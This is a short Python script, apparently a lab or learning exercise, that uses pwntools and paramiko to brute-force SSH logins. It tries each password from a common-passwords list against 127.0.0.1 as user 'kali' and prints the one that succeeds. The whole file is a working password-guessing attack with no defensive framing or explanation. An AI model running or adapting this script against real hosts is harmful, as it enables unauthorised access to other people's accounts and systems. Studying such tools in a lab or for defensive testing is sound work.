from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0

with open("ssh-common-passwords.txt","r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Atempting password: '{}'!".format(attempts,password))
			response = ssh(host=host, user=username, password=password, timeout=2)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password!")
		attempts += 1
